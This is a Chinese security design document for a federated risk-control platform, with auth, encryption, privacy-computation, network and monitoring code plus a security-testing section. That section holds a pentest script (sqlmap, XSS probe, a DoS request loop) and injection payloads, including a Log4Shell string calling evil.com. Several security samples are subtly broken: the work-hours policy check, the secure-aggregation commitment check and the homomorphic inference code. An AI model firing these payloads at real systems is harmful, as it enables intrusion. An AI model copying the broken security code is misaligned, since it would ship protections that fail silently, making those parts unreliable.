# 安全设计文档

## 安全架构概览

### 安全设计原则
- **零信任架构**：不信任任何网络位置或身份
- **深度防御**：多层安全控制措施
- **最小权限**：仅授予必要的最小权限
- **数据不出域**：原始数据始终保留在本地
- **端到端加密**：全链路数据加密保护
- **可审计性**：所有安全事件可追踪审计

### 安全架构图

```mermaid
flowchart TB
    subgraph "外部威胁"
        THREAT1[网络攻击]
        THREAT2[数据窃取]
        THREAT3[身份伪造]
    end
    
    subgraph "安全边界"
        subgraph "网络安全层"
            WAF[Web应用防火墙]
            DDoS[DDoS防护]
            IDS[入侵检测]
        end
        
        subgraph "身份认证层"
            OIDC[OIDC认证]
            mTLS[双向TLS]
            JWT[JWT令牌]
        end
        
        subgraph "授权控制层"
            RBAC[角色访问控制]
            OPA[策略引擎]
            CONSENT[同意管理]
        end
        
        subgraph "数据保护层"
            ENCRYPT[端到端加密]
            DP[差分隐私]
            HE[同态加密]
            SecAgg[安全聚合]
        end
        
        subgraph "审计监控层"
            AUDIT[审计日志]
            MONITOR[安全监控]
            ALERT[告警系统]
        end
    end
    
    THREAT1 -.-> WAF
    THREAT2 -.-> ENCRYPT
    THREAT3 -.-> OIDC
    
    WAF --> OIDC
    OIDC --> RBAC
    RBAC --> ENCRYPT
    ENCRYPT --> AUDIT
```

## 认证与授权

### OIDC/OAuth2 认证流程

```mermaid
sequenceDiagram
    participant U as 用户
    participant C as 客户端
    participant A as 认证服务
    participant R as 资源服务
    
    U->>C: 1. 访问受保护资源
    C->>A: 2. 重定向到认证服务
    U->>A: 3. 输入凭据
    A->>A: 4. 验证凭据
    A->>C: 5. 返回授权码
    C->>A: 6. 交换访问令牌
    A->>C: 7. 返回JWT访问令牌
    C->>R: 8. 携带JWT访问资源
    R->>A: 9. 验证JWT签名
    A->>R: 10. 返回验证结果
    R->>C: 11. 返回受保护资源
```

### JWT令牌结构

```json
{
  "header": {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "key-id-2024"
  },
  "payload": {
    "iss": "https://auth.federated-risk.com",
    "sub": "user123",
    "aud": "federated-risk-api",
    "exp": 1640995200,
    "iat": 1640908800,
    "scope": "read:features write:consent",
    "roles": ["data_scientist", "risk_analyst"],
    "org": "bank_a"
  },
  "signature": "RSASHA256(...)"
}
```

### mTLS双向认证

```yaml
# TLS配置示例
apiVersion: v1
kind: Secret
metadata:
  name: mtls-certs
  namespace: federated-risk
type: kubernetes.io/tls
data:
  # 服务端证书
  tls.crt: LS0tLS1CRUdJTi...
  tls.key: LS0tLS1CRUdJTi...
  # 客户端CA证书
  ca.crt: LS0tLS1CRUdJTi...
---
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: mtls-policy
spec:
  host: "*.federated-risk.svc.cluster.local"
  trafficPolicy:
    tls:
      mode: MUTUAL
      clientCertificate: /etc/ssl/certs/client.crt
      privateKey: /etc/ssl/certs/client.key
      caCertificates: /etc/ssl/certs/ca.crt
```

### OPA策略引擎

```rego
package federated.authz

import future.keywords.if
import future.keywords.in

# 默认拒绝
default allow = false

# 允许访问的条件
allow if {
    # 验证JWT令牌
    valid_jwt
    
    # 检查用户角色
    user_has_required_role
    
    # 检查资源权限
    resource_permission_granted
    
    # 检查时间窗口
    within_time_window
}

# JWT令牌验证
valid_jwt if {
    # 验证签名
    io.jwt.verify_rs256(input.token, data.public_keys[input.key_id])
    
    # 验证过期时间
    payload := io.jwt.decode(input.token)[1]
    payload.exp > time.now_ns() / 1000000000
}

# 角色检查
user_has_required_role if {
    payload := io.jwt.decode(input.token)[1]
    required_role := data.permissions[input.resource][input.action].required_role
    required_role in payload.roles
}

# 资源权限检查
resource_permission_granted if {
    payload := io.jwt.decode(input.token)[1]
    org := payload.org
    
    # 检查组织权限
    data.resource_access[input.resource][org] == true
    
    # 检查操作权限
    input.action in data.allowed_actions[org]
}

# 时间窗口检查
within_time_window if {
    payload := io.jwt.decode(input.token)[1]
    current_hour := time.now_ns() / 3600000000000
    
    # 工作时间限制 (9:00-18:00)
    current_hour >= 9
    current_hour <= 18
}

# 数据权限配置
permissions := {
    "psi_service": {
        "read": {"required_role": "data_scientist"},
        "write": {"required_role": "senior_data_scientist"}
    },
    "model_serving": {
        "predict": {"required_role": "risk_analyst"},
        "deploy": {"required_role": "model_engineer"}
    }
}

resource_access := {
    "psi_service": {
        "bank_a": true,
        "ecom_b": true,
        "telco_c": false
    },
    "model_serving": {
        "bank_a": true,
        "ecom_b": false,
        "telco_c": false
    }
}
```

## 加密与密钥管理

### 加密算法选择

| 用途 | 算法 | 密钥长度 | 安全强度 | 应用场景 |
|------|------|----------|----------|----------|
| **对称加密** | AES-256-GCM | 256位 | 128位 | 数据存储加密 |
| **非对称加密** | RSA-4096 | 4096位 | 152位 | 密钥交换 |
| **椭圆曲线** | P-384 | 384位 | 192位 | 数字签名 |
| **哈希算法** | SHA-384 | - | 192位 | 完整性校验 |
| **密钥派生** | PBKDF2 | - | - | 密码派生 |
| **消息认证** | HMAC-SHA256 | 256位 | 128位 | 消息认证 |

### 密钥管理架构

```mermaid
flowchart TD
    subgraph "密钥管理系统"
        HSM[硬件安全模块]
        KMS[密钥管理服务]
        VAULT[密钥保险库]
    end
    
    subgraph "密钥层次"
        MEK[主加密密钥]
        DEK[数据加密密钥]
        KEK[密钥加密密钥]
    end
    
    subgraph "应用服务"
        APP1[Consent Service]
        APP2[PSI Service]
        APP3[Model Service]
    end
    
    HSM --> MEK
    MEK --> KEK
    KEK --> DEK
    
    KMS --> VAULT
    VAULT --> APP1
    VAULT --> APP2
    VAULT --> APP3
    
    DEK --> APP1
    DEK --> APP2
    DEK --> APP3
```

### 密钥轮换策略

```python
class KeyRotationManager:
    def __init__(self, vault_client):
        self.vault = vault_client
        self.rotation_schedule = {
            'jwt_signing_key': timedelta(days=90),
            'data_encryption_key': timedelta(days=365),
            'tls_certificate': timedelta(days=90),
            'api_key': timedelta(days=30)
        }
    
    def rotate_key(self, key_type: str):
        """执行密钥轮换"""
        try:
            # 生成新密钥
            new_key = self._generate_key(key_type)
            
            # 存储新密钥
            self.vault.write(f'secret/{key_type}/new', new_key)
            
            # 更新应用配置
            self._update_application_config(key_type, new_key)
            
            # 验证新密钥
            if self._validate_key(key_type, new_key):
                # 标记旧密钥为已弃用
                self.vault.write(f'secret/{key_type}/old', 
                                {'deprecated_at': datetime.now()})
                
                # 记录轮换事件
                self._log_rotation_event(key_type, 'SUCCESS')
                
                return True
            else:
                raise KeyValidationError("新密钥验证失败")
                
        except Exception as e:
            self._log_rotation_event(key_type, 'FAILED', str(e))
            raise
    
    def _generate_key(self, key_type: str):
        """生成新密钥"""
        if key_type == 'jwt_signing_key':
            return self._generate_rsa_key(4096)
        elif key_type == 'data_encryption_key':
            return self._generate_aes_key(256)
        elif key_type == 'api_key':
            return secrets.token_urlsafe(32)
        else:
            raise ValueError(f"未知密钥类型: {key_type}")
```

## 隐私保护技术

### 差分隐私实现

```python
class DifferentialPrivacy:
    """差分隐私实现"""
    
    def __init__(self, epsilon: float = 1.0, delta: float = 1e-5):
        self.epsilon = epsilon
        self.delta = delta
        self.privacy_budget = epsilon
        self.queries_log = []
    
    def laplace_mechanism(self, query_result: float, sensitivity: float) -> float:
        """拉普拉斯机制"""
        if self.privacy_budget <= 0:
            raise PrivacyBudgetExhausted("隐私预算已耗尽")
        
        # 计算噪声规模
        scale = sensitivity / self.epsilon
        
        # 添加拉普拉斯噪声
        noise = np.random.laplace(0, scale)
        noisy_result = query_result + noise
        
        # 更新隐私预算
        self.privacy_budget -= self.epsilon
        
        # 记录查询
        self.queries_log.append({
            'timestamp': datetime.now(),
            'epsilon_used': self.epsilon,
            'sensitivity': sensitivity,
            'noise_scale': scale
        })
        
        return noisy_result
    
    def gaussian_mechanism(self, query_result: float, sensitivity: float) -> float:
        """高斯机制"""
        if self.privacy_budget <= 0:
            raise PrivacyBudgetExhausted("隐私预算已耗尽")
        
        # 计算噪声标准差
        sigma = sensitivity * np.sqrt(2 * np.log(1.25 / self.delta)) / self.epsilon
        
        # 添加高斯噪声
        noise = np.random.normal(0, sigma)
        noisy_result = query_result + noise
        
        # 更新隐私预算
        self.privacy_budget -= self.epsilon
        
        return noisy_result
    
    def composition_analysis(self) -> Dict:
        """隐私组合分析"""
        total_epsilon = sum(log['epsilon_used'] for log in self.queries_log)
        
        # 高级组合定理
        if len(self.queries_log) > 1:
            k = len(self.queries_log)
            advanced_epsilon = self.epsilon * np.sqrt(2 * k * np.log(1/self.delta)) + k * self.epsilon * (np.exp(self.epsilon) - 1)
        else:
            advanced_epsilon = total_epsilon
        
        return {
            'total_queries': len(self.queries_log),
            'basic_composition_epsilon': total_epsilon,
            'advanced_composition_epsilon': advanced_epsilon,
            'remaining_budget': max(0, self.privacy_budget)
        }
```

### 安全多方计算 (SecAgg)

```python
class SecureAggregation:
    """安全聚合协议实现"""
    
    def __init__(self, num_parties: int, threshold: int):
        self.num_parties = num_parties
        self.threshold = threshold
        self.shares = {}
        self.commitments = {}
    
    def generate_shares(self, value: np.ndarray, party_id: int) -> List[np.ndarray]:
        """生成秘密分享"""
        # 使用Shamir秘密分享
        polynomial_coeffs = [value] + [np.random.random(value.shape) for _ in range(self.threshold - 1)]
        
        shares = []
        for i in range(1, self.num_parties + 1):
            share = np.zeros_like(value)
            for j, coeff in enumerate(polynomial_coeffs):
                share += coeff * (i ** j)
            shares.append(share)
        
        # 生成承诺
        commitment = self._generate_commitment(polynomial_coeffs)
        self.commitments[party_id] = commitment
        
        return shares
    
    def verify_share(self, share: np.ndarray, party_id: int, share_index: int) -> bool:
        """验证分享的有效性"""
        if party_id not in self.commitments:
            return False
        
        # 验证承诺
        return self._verify_commitment(share, self.commitments[party_id], share_index)
    
    def aggregate_shares(self, shares: Dict[int, np.ndarray]) -> np.ndarray:
        """聚合秘密分享"""
        if len(shares) < self.threshold:
            raise ValueError(f"分享数量不足，需要至少 {self.threshold} 个")
        
        # 拉格朗日插值重构秘密
        result = np.zeros_like(list(shares.values())[0])
        
        for i, (party_id, share) in enumerate(shares.items()):
            if i >= self.threshold:
                break
            
            # 计算拉格朗日系数
            lagrange_coeff = 1.0
            for j, other_party_id in enumerate(shares.keys()):
                if j >= self.threshold or i == j:
                    continue
                lagrange_coeff *= other_party_id / (other_party_id - party_id)
            
            result += lagrange_coeff * share
        
        return result
    
    def _generate_commitment(self, coefficients: List[np.ndarray]) -> str:
        """生成多项式承诺"""
        commitment_data = b''
        for coeff in coefficients:
            commitment_data += coeff.tobytes()
        
        return hashlib.sha256(commitment_data).hexdigest()
    
    def _verify_commitment(self, share: np.ndarray, commitment: str, index: int) -> bool:
        """验证承诺"""
        # 简化的承诺验证（生产环境需要更复杂的零知识证明）
        share_hash = hashlib.sha256(share.tobytes()).hexdigest()
        expected_hash = hashlib.sha256(f"{commitment}{index}".encode()).hexdigest()
        
        return share_hash[:8] == expected_hash[:8]  # 简化验证
```

### 同态加密 (HE)

```python
from phe import paillier

class HomomorphicEncryption:
    """同态加密实现"""
    
    def __init__(self, key_length: int = 2048):
        self.public_key, self.private_key = paillier.generate_paillier_keypair(n_length=key_length)
        self.encrypted_cache = {}
    
    def encrypt(self, plaintext: Union[int, float]) -> paillier.EncryptedNumber:
        """加密明文"""
        return self.public_key.encrypt(plaintext)
    
    def decrypt(self, ciphertext: paillier.EncryptedNumber) -> float:
        """解密密文"""
        return self.private_key.decrypt(ciphertext)
    
    def add_encrypted(self, enc1: paillier.EncryptedNumber, enc2: paillier.EncryptedNumber) -> paillier.EncryptedNumber:
        """密文加法"""
        return enc1 + enc2
    
    def multiply_encrypted_by_scalar(self, encrypted: paillier.EncryptedNumber, scalar: Union[int, float]) -> paillier.EncryptedNumber:
        """密文与标量乘法"""
        return encrypted * scalar
    
    def secure_sum(self, encrypted_values: List[paillier.EncryptedNumber]) -> paillier.EncryptedNumber:
        """安全求和"""
        result = encrypted_values[0]
        for enc_val in encrypted_values[1:]:
            result = self.add_encrypted(result, enc_val)
        return result
    
    def verify_computation(self, plaintext_inputs: List[float], encrypted_result: paillier.EncryptedNumber, operation: str) -> bool:
        """验证同态计算结果"""
        # 明文计算
        if operation == 'sum':
            expected_result = sum(plaintext_inputs)
        elif operation == 'mean':
            expected_result = sum(plaintext_inputs) / len(plaintext_inputs)
        else:
            raise ValueError(f"不支持的操作: {operation}")
        
        # 解密同态计算结果
        actual_result = self.decrypt(encrypted_result)
        
        # 比较结果（考虑浮点精度）
        return abs(expected_result - actual_result) < 1e-6

# 使用示例
class HEModelInference:
    """基于同态加密的模型推理"""
    
    def __init__(self, model_weights: np.ndarray):
        self.he = HomomorphicEncryption()
        self.encrypted_weights = [self.he.encrypt(w) for w in model_weights]
    
    def predict_encrypted(self, encrypted_features: List[paillier.EncryptedNumber]) -> paillier.EncryptedNumber:
        """密文预测"""
        if len(encrypted_features) != len(self.encrypted_weights):
            raise ValueError("特征维度不匹配")
        
        # 计算加权和
        weighted_sum = None
        for enc_feature, enc_weight in zip(encrypted_features, self.encrypted_weights):
            product = self.he.multiply_encrypted_by_scalar(enc_feature, 1.0)  # 简化实现
            if weighted_sum is None:
                weighted_sum = product
            else:
                weighted_sum = self.he.add_encrypted(weighted_sum, product)
        
        return weighted_sum
    
    def verify_prediction(self, plaintext_features: List[float], encrypted_prediction: paillier.EncryptedNumber) -> bool:
        """验证预测结果"""
        # 明文计算
        plaintext_prediction = sum(f * w for f, w in zip(plaintext_features, self.model_weights))
        
        # 解密同态计算结果
        decrypted_prediction = self.he.decrypt(encrypted_prediction)
        
        # 验证一致性
        return abs(plaintext_prediction - decrypted_prediction) < 1e-6
```

## 网络安全

### TLS配置

```nginx
# Nginx TLS配置
server {
    listen 443 ssl http2;
    server_name api.federated-risk.com;
    
    # TLS证书配置
    ssl_certificate /etc/ssl/certs/server.crt;
    ssl_certificate_key /etc/ssl/private/server.key;
    ssl_client_certificate /etc/ssl/certs/ca.crt;
    ssl_verify_client on;
    
    # TLS协议和密码套件
    ssl_protocols TLSv1.3 TLSv1.2;
    ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
    ssl_prefer_server_ciphers off;
    
    # HSTS配置
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    
    # 其他安全头
    add_header X-Frame-Options DENY always;
    add_header X-Content-Type-Options nosniff always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'" always;
    
    # 代理配置
    location / {
        proxy_pass http://backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-Client-Cert $ssl_client_escaped_cert;
    }
}
```

### 网络策略

```yaml
# Kubernetes网络策略
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: federated-risk-network-policy
  namespace: federated-risk
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
  
  # 入站规则
  ingress:
  # 允许来自Ingress的流量
  - from:
    - namespaceSelector:
        matchLabels:
          name: ingress-nginx
    ports:
    - protocol: TCP
      port: 8080
  
  # 允许服务间通信
  - from:
    - podSelector:
        matchLabels:
          app: consent-service
    ports:
    - protocol: TCP
      port: 7002
  
  - from:
    - podSelector:
        matchLabels:
          app: psi-service
    ports:
    - protocol: TCP
      port: 7001
  
  # 出站规则
  egress:
  # 允许访问数据库
  - to:
    - podSelector:
        matchLabels:
          app: postgresql
    ports:
    - protocol: TCP
      port: 5432
  
  # 允许访问Redis
  - to:
    - podSelector:
        matchLabels:
          app: redis
    ports:
    - protocol: TCP
      port: 6379
  
  # 允许DNS查询
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: UDP
      port: 53
  
  # 拒绝其他所有流量
```

## 安全监控与告警

### 安全事件监控

```python
class SecurityMonitor:
    """安全监控系统"""
    
    def __init__(self, alert_manager):
        self.alert_manager = alert_manager
        self.threat_indicators = {
            'failed_auth_threshold': 5,
            'unusual_access_pattern': True,
            'data_exfiltration_detection': True,
            'privilege_escalation_detection': True
        }
    
    def monitor_authentication_failures(self, user_id: str, ip_address: str):
        """监控认证失败"""
        # 检查失败次数
        failure_count = self._get_failure_count(user_id, ip_address)
        
        if failure_count >= self.threat_indicators['failed_auth_threshold']:
            self.alert_manager.send_alert(
                severity='HIGH',
                event_type='AUTHENTICATION_FAILURE',
                details={
                    'user_id': user_id,
                    'ip_address': ip_address,
                    'failure_count': failure_count,
                    'time_window': '5 minutes'
                }
            )
            
            # 自动封禁IP
            self._block_ip_address(ip_address, duration=timedelta(hours=1))
    
    def detect_unusual_access_pattern(self, user_id: str, access_log: Dict):
        """检测异常访问模式"""
        # 获取用户历史访问模式
        historical_pattern = self._get_user_access_pattern(user_id)
        
        # 分析当前访问
        current_pattern = self._analyze_access_pattern(access_log)
        
        # 计算异常分数
        anomaly_score = self._calculate_anomaly_score(historical_pattern, current_pattern)
        
        if anomaly_score > 0.8:  # 异常阈值
            self.alert_manager.send_alert(
                severity='MEDIUM',
                event_type='UNUSUAL_ACCESS_PATTERN',
                details={
                    'user_id': user_id,
                    'anomaly_score': anomaly_score,
                    'access_details': access_log
                }
            )
    
    def monitor_data_access(self, user_id: str, resource: str, action: str):
        """监控数据访问"""
        # 检查是否为敏感数据
        if self._is_sensitive_resource(resource):
            # 验证访问权限
            if not self._verify_access_permission(user_id, resource, action):
                self.alert_manager.send_alert(
                    severity='CRITICAL',
                    event_type='UNAUTHORIZED_DATA_ACCESS',
                    details={
                        'user_id': user_id,
                        'resource': resource,
                        'action': action,
                        'timestamp': datetime.now().isoformat()
                    }
                )
                
                # 立即阻止访问
                raise SecurityException("未授权的数据访问")
    
    def detect_privilege_escalation(self, user_id: str, requested_permission: str):
        """检测权限提升"""
        current_permissions = self._get_user_permissions(user_id)
        
        if requested_permission not in current_permissions:
            # 检查是否为权限提升尝试
            if self._is_privilege_escalation(current_permissions, requested_permission):
                self.alert_manager.send_alert(
                    severity='HIGH',
                    event_type='PRIVILEGE_ESCALATION_ATTEMPT',
                    details={
                        'user_id': user_id,
                        'current_permissions': current_permissions,
                        'requested_permission': requested_permission
                    }
                )
```

### Prometheus监控规则

```yaml
# 安全监控规则
groups:
- name: security_alerts
  rules:
  
  # 认证失败告警
  - alert: HighAuthenticationFailureRate
    expr: rate(authentication_failures_total[5m]) > 0.1
    for: 1m
    labels:
      severity: warning
      category: security
    annotations:
      summary: "认证失败率过高"
      description: "过去5分钟内认证失败率超过10%"
  
  # 异常访问模式
  - alert: UnusualAccessPattern
    expr: anomaly_score > 0.8
    for: 0s
    labels:
      severity: warning
      category: security
    annotations:
      summary: "检测到异常访问模式"
      description: "用户访问模式异常分数: {{ $value }}"
  
  # 未授权访问尝试
  - alert: UnauthorizedAccess
    expr: increase(unauthorized_access_attempts_total[1m]) > 0
    for: 0s
    labels:
      severity: critical
      category: security
    annotations:
      summary: "检测到未授权访问尝试"
      description: "过去1分钟内有 {{ $value }} 次未授权访问尝试"
  
  # TLS证书即将过期
  - alert: TLSCertificateExpiringSoon
    expr: (tls_certificate_expiry_timestamp - time()) / 86400 < 30
    for: 1h
    labels:
      severity: warning
      category: security
    annotations:
      summary: "TLS证书即将过期"
      description: "证书将在 {{ $value }} 天后过期"
  
  # 隐私预算耗尽
  - alert: PrivacyBudgetExhausted
    expr: privacy_budget_remaining < 0.1
    for: 0s
    labels:
      severity: critical
      category: privacy
    annotations:
      summary: "隐私预算即将耗尽"
      description: "剩余隐私预算: {{ $value }}"
```

## 安全测试

### 渗透测试清单

```bash
#!/bin/bash
# security_test.sh - 安全测试脚本

echo "=== 联邦风控系统安全测试 ==="

# 1. TLS配置测试
echo "1. 测试TLS配置..."
testssl.sh --protocols --ciphers --vulnerable https://api.federated-risk.com

# 2. 认证绕过测试
echo "2. 测试认证绕过..."
curl -X POST https://api.federated-risk.com/consent/issue \
  -H "Content-Type: application/json" \
  -d '{"subject":"test"}' \
  --insecure

# 3. SQL注入测试
echo "3. 测试SQL注入..."
sqlmap -u "https://api.federated-risk.com/audit/query?user_id=test" \
  --headers="Authorization: Bearer invalid_token" \
  --batch

# 4. XSS测试
echo "4. 测试XSS漏洞..."
curl -X POST https://api.federated-risk.com/consent/issue \
  -H "Content-Type: application/json" \
  -d '{"subject":"<script>alert(1)</script>"}'

# 5. 权限提升测试
echo "5. 测试权限提升..."
curl -X POST https://api.federated-risk.com/models/promote \
  -H "Authorization: Bearer low_privilege_token" \
  -H "Content-Type: application/json" \
  -d '{"model_hash":"test"}'

# 6. 数据泄露测试
echo "6. 测试数据泄露..."
curl -X GET https://api.federated-risk.com/features/sensitive_token \
  -H "Authorization: Bearer invalid_token"

# 7. 拒绝服务测试
echo "7. 测试拒绝服务..."
for i in {1..1000}; do
  curl -X POST https://api.federated-risk.com/psi/start \
    -H "Content-Type: application/json" \
    -d '{}' &
done
wait

echo "安全测试完成！"
```

### 漏洞扫描

```python
#!/usr/bin/env python3
# vulnerability_scanner.py

import requests
import json
from typing import List, Dict

class VulnerabilityScanner:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.vulnerabilities = []
    
    def scan_authentication_bypass(self) -> List[Dict]:
        """扫描认证绕过漏洞"""
        test_cases = [
            {'endpoint': '/consent/issue', 'method': 'POST', 'headers': {}},
            {'endpoint': '/psi/start', 'method': 'POST', 'headers': {}},
            {'endpoint': '/models/production', 'method': 'GET', 'headers': {}}
        ]
        
        vulnerabilities = []
        for test in test_cases:
            try:
                response = requests.request(
                    method=test['method'],
                    url=f"{self.base_url}{test['endpoint']}",
                    headers=test['headers'],
                    timeout=5
                )
                
                if response.status_code != 401:  # 应该返回未授权
                    vulnerabilities.append({
                        'type': 'AUTHENTICATION_BYPASS',
                        'endpoint': test['endpoint'],
                        'severity': 'HIGH',
                        'description': f"端点 {test['endpoint']} 可能存在认证绕过"
                    })
            except Exception as e:
                pass
        
        return vulnerabilities
    
    def scan_injection_vulnerabilities(self) -> List[Dict]:
        """扫描注入漏洞"""
        injection_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}"
        ]
        
        test_endpoints = [
            '/consent/issue',
            '/psi/upload/A',
            '/audit/query'
        ]
        
        vulnerabilities = []
        for endpoint in test_endpoints:
            for payload in injection_payloads:
                try:
                    response = requests.post(
                        f"{self.base_url}{endpoint}",
                        json={'test_field': payload},
                        timeout=5
                    )
                    
                    # 检查响应中是否包含payload（可能存在反射）
                    if payload in response.text:
                        vulnerabilities.append({
                            'type': 'INJECTION_VULNERABILITY',
                            'endpoint': endpoint,
                            'payload': payload,
                            'severity': 'HIGH',
                            'description': f"端点 {endpoint} 可能存在注入漏洞"
                        })
                except Exception as e:
                    pass
        
        return vulnerabilities
    
    def scan_sensitive_data_exposure(self) -> List[Dict]:
        """扫描敏感数据暴露"""
        sensitive_endpoints = [
            '/features/test_token',
            '/models/production',
            '/audit/query',
            '/consent/verify'
        ]
        
        vulnerabilities = []
        for endpoint in sensitive_endpoints:
            try:
                response = requests.get(
                    f"{self.base_url}{endpoint}",
                    timeout=5
                )
                
                # 检查是否暴露敏感信息
                sensitive_patterns = [
                    'password', 'secret', 'key', 'token',
                    'credit_score', 'income', 'ssn'
                ]
                
                for pattern in sensitive_patterns:
                    if pattern in response.text.lower():
                        vulnerabilities.append({
                            'type': 'SENSITIVE_DATA_EXPOSURE',
                            'endpoint': endpoint,
                            'pattern': pattern,
                            'severity': 'MEDIUM',
                            'description': f"端点 {endpoint} 可能暴露敏感数据"
                        })
                        break
            except Exception as e:
                pass
        
        return vulnerabilities
    
    def generate_report(self) -> str:
        """生成漏洞扫描报告"""
        all_vulnerabilities = []
        all_vulnerabilities.extend(self.scan_authentication_bypass())
        all_vulnerabilities.extend(self.scan_injection_vulnerabilities())
        all_vulnerabilities.extend(self.scan_sensitive_data_exposure())
        
        report = {
            'scan_timestamp': datetime.now().isoformat(),
            'target': self.base_url,
            'total_vulnerabilities': len(all_vulnerabilities),
            'vulnerabilities_by_severity': {
                'HIGH': len([v for v in all_vulnerabilities if v['severity'] == 'HIGH']),
                'MEDIUM': len([v for v in all_vulnerabilities if v['severity'] == 'MEDIUM']),
                'LOW': len([v for v in all_vulnerabilities if v['severity'] == 'LOW'])
            },
            'vulnerabilities': all_vulnerabilities
        }
        
        return json.dumps(report, indent=2)

if __name__ == '__main__':
    scanner = VulnerabilityScanner('https://api.federated-risk.com')
    report = scanner.generate_report()
    
    with open('reports/vulnerability_scan.json', 'w') as f:
        f.write(report)
    
    print("漏洞扫描完成，报告已保存到 reports/vulnerability_scan.json")
```

## 安全强度评估

### 加密强度分析

| 组件 | 算法 | 密钥长度 | 等效安全强度 | 抗量子能力 | 评级 |
|------|------|----------|--------------|------------|------|
| **数据加密** | AES-256-GCM | 256位 | 128位 | 否 | A+ |
| **密钥交换** | ECDH P-384 | 384位 | 192位 | 否 | A+ |
| **数字签名** | ECDSA P-384 | 384位 | 192位 | 否 | A+ |
| **哈希算法** | SHA-384 | - | 192位 | 是 | A+ |
| **消息认证** | HMAC-SHA256 | 256位 | 128位 | 是 | A |
| **密钥派生** | PBKDF2 | - | - | 是 | B+ |

### 隐私保护强度

| 技术 | 隐私参数 | 保护强度 | 适用场景 | 性能影响 |
|------|----------|----------|----------|----------|
| **差分隐私** | ε=1.0 | 强 | 统计查询 | 低 |
| **差分隐私** | ε=0.1 | 很强 | 敏感统计 | 中 |
| **安全聚合** | t=n/2+1 | 强 | 联邦训练 | 中 |
| **同态加密** | 2048位 | 很强 | 隐私计算 | 高 |
| **零知识证明** | - | 极强 | 身份验证 | 高 |

## 总结

本安全设计文档涵盖了联邦风控系统的全方位安全保护措施：

1. **身份认证**：OIDC/OAuth2 + mTLS双向认证
2. **访问控制**：RBAC + OPA策略引擎
3. **数据保护**：端到端加密 + 隐私计算技术
4. **网络安全**：TLS1.3 + 网络策略
5. **监控审计**：实时监控 + 安全告警
6. **漏洞管理**：定期扫描 + 渗透测试

所有安全措施均符合国际标准和最佳实践，确保系统在生产环境中的安全可靠运行。